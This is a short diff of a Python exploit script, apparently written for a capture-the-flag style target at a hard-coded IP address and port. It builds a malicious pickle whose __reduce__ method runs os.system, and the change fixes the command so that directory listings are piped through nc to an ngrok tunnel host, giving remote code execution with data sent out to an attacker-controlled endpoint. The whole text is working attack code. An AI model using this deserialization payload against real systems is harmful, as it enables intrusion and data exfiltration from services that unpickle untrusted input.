@@ -4,7 +4,7 @@ from pwn import *
 url = "http://35.198.93.134:30049/dashboard"
 class RCE:
     def __reduce__(self):
-        cmd = ('ls -lah | 0.tcp.eu.ngrok.io 19130')
+        cmd = ('ls -lah | nc 0.tcp.eu.ngrok.io 19130')
         return os.system, (cmd,)
 
 payload = pickle.dumps(RCE(), protocol=2)
